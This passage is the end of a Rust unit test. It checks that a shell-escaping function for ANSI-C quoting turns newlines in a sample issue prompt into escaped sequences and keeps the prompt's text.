        let prompt = "Issue #42: Backend broken\nStatus: Open\n\nDescription:\nThe API returns 500\n\n---\nFix the bug";
        let escaped = shell_escape_for_ansi_c_quotes(prompt);
        assert!(!escaped.contains('\n')); // no literal newline bytes
        assert!(escaped.contains("\\n")); // escaped newlines present
        assert!(escaped.contains("Issue #42"));
        assert!(escaped.contains("Fix the bug"));
    }
}
